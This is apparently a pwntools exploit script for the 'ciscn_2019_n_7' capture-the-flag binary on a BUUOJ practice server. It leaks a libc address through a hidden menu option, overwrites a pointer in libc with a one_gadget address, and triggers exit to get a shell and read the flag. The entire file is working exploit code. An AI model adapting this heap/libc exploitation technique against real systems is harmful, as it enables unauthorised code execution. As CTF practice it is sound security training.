from pwn import *

elf = ELF('./ciscn_2019_n_7')
libc = ELF('./libc.so.6')
#sh = process(elf.path)
sh = remote('node4.buuoj.cn', 29104)
context(arch = 'amd64', os = 'linux', log_level = 'debug')

def add(size, name):
    sh.recvuntil("choice-> \n")
    sh.sendline('1')
    sh.recvuntil("Length: \n")
    sh.sendline(str(size))
    sh.recvuntil("Author name:\n")
    sh.send(name)
    
def edit(name, content):
    sh.recvuntil("choice-> \n")
    sh.sendline('2')
    sh.recvuntil("name:\n")
    sh.send(name)
    sh.recvuntil("contents:\n")
    sh.sendline(content)

def exit():
    sh.recvuntil("choice-> ")
    sh.sendline('4')

sh.recvuntil("choice-> \n")
sh.sendline("666")
addr = sh.recv(14)
addr = int(addr, 16)
log.info("puts_got " + hex(addr))

libc_base = addr - libc.sym['puts']
one_gadget = libc_base + 0xf1147
log.info("libc_base " + hex(libc_base))
add(0x80, "a" * 8)
edit(b"a" * 8 + p64(libc_base + 0x5f0040 + 3848), p64(one_gadget) * 2)
exit()
sh.sendline("cat flag >&0")

sh.interactive()
